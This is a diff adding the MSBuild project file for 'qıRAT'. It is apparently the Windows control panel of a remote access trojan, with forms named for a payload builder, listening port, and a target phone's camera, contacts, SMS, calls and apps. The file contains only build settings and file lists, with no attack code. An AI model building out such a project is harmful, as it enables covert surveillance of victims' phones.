@@ -1,0 +1,184 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{048538BD-1B9A-4C4A-93F1-B9EE08426D7A}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>qıRAT</RootNamespace>
+    <AssemblyName>qıRAT</AssemblyName>
+    <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+    <Deterministic>true</Deterministic>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>0</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>at.ico</ApplicationIcon>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Deployment" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Net.Http" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="aboutform2.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="aboutform2.Designer.cs">
+      <DependentUpon>aboutform2.cs</DependentUpon>
+    </Compile>
+    <Compile Include="applicationsform.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="applicationsform.Designer.cs">
+      <DependentUpon>applicationsform.cs</DependentUpon>
+    </Compile>
+    <Compile Include="builderform.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="builderform.Designer.cs">
+      <DependentUpon>builderform.cs</DependentUpon>
+    </Compile>
+    <Compile Include="callsform.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="callsform.Designer.cs">
+      <DependentUpon>callsform.cs</DependentUpon>
+    </Compile>
+    <Compile Include="cameraform.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="cameraform.Designer.cs">
+      <DependentUpon>cameraform.cs</DependentUpon>
+    </Compile>
+    <Compile Include="contactsform.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="contactsform.Designer.cs">
+      <DependentUpon>contactsform.cs</DependentUpon>
+    </Compile>
+    <Compile Include="mainform.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="mainform.Designer.cs">
+      <DependentUpon>mainform.cs</DependentUpon>
+    </Compile>
+    <Compile Include="portform.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="portform.Designer.cs">
+      <DependentUpon>portform.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DesignTime>True</DesignTime>
+      <DependentUpon>Resources.resx</DependentUpon>
+    </Compile>
+    <Compile Include="smsform.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="smsform.Designer.cs">
+      <DependentUpon>smsform.cs</DependentUpon>
+    </Compile>
+    <Compile Include="socket.cs" />
+    <EmbeddedResource Include="aboutform2.resx">
+      <DependentUpon>aboutform2.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="applicationsform.resx">
+      <DependentUpon>applicationsform.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="builderform.resx">
+      <DependentUpon>builderform.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="callsform.resx">
+      <DependentUpon>callsform.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="cameraform.resx">
+      <DependentUpon>cameraform.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="contactsform.resx">
+      <DependentUpon>contactsform.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="mainform.resx">
+      <DependentUpon>mainform.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="portform.resx">
+      <DependentUpon>portform.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Properties\Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <SubType>Designer</SubType>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Include="smsform.resx">
+      <DependentUpon>smsform.cs</DependentUpon>
+    </EmbeddedResource>
+    <None Include="Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+    <Compile Include="Properties\Settings.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="App.config" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\Apk.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\blackqiratascci.jpeg" />
+  </ItemGroup>
+  <ItemGroup>
+    <Content Include="at.ico" />
+    <Content Include="qiratlogo.ico" />
+    <None Include="Resources\icons8-question-30.png" />
+    <None Include="Resources\icons8-apk-24.png" />
+    <None Include="Resources\icons8-i-24.png" />
+    <None Include="Resources\icons8-about-24.png" />
+    <None Include="Resources\icons8-history-24.png" />
+    <None Include="Resources\icons8-folder-24.png" />
+    <None Include="Resources\icons8-web-camera-24.png" />
+    <None Include="Resources\icons8-contacts-24.png" />
+    <None Include="Resources\icons8-message-24.png" />
+    <None Include="Resources\icons8-call-24.png" />
+    <None Include="Resources\icons8-apps-24.png" />
+    <None Include="Resources\icons8-live-photos-24.png" />
+    <None Include="Resources\icons8-communication-24.png" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
